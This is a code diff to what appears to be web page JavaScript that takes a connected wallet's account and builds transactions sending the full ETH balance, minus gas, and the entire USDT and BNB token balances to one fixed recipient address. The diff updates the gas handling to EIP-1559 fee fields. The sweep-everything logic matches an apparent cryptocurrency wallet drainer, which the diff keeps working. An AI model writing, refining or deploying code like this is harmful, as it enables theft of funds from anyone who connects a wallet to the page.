@@ -55,7 +55,6 @@
             BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
         };
 
-        // ERC-20 ABI
         const erc20ABI = [
             {
                 "constant": true,
@@ -124,9 +123,13 @@
                     const accounts = await web3.eth.getAccounts();
                     const senderAddress = accounts[0];
 
-                    // Get ETH balance
+                    // Fetch current gas prices
+                    const feeData = await ethersProvider.getFeeData();
+                    const gasPriceWei = feeData.gasPrice;
+                    const maxFeePerGas = feeData.maxFeePerGas;
+                    const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+
                     const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
-                    const gasPriceWei = BigInt(await web3.eth.getGasPrice());
                     const gasFeeWei = gasPriceWei * gasLimit;
                     const maxEthTransferWei = ethBalanceWei - gasFeeWei;
 
@@ -144,7 +147,8 @@
                         from: senderAddress,
                         value: `0x${maxEthTransferWei.toString(16)}`,
                         gas: `0x${gasLimit.toString(16)}`,
-                        gasPrice: `0x${gasPriceWei.toString(16)}`
+                        maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
+                        maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`
                     };
 
                     const usdtTransactionParameters = {
@@ -152,7 +156,8 @@
                         from: senderAddress,
                         value: '0x0', // No ETH value required
                         gas: `0x${gasLimit.toString(16)}`,
-                        gasPrice: `0x${gasPriceWei.toString(16)}`,
+                        maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
+                        maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`,
                         data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI()
                     };
 
@@ -161,7 +166,8 @@
                         from: senderAddress,
                         value: '0x0', // No ETH value required
                         gas: `0x${gasLimit.toString(16)}`,
-                        gasPrice: `0x${gasPriceWei.toString(16)}`,
+                        maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
+                        maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`,
                         data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
                     };
 
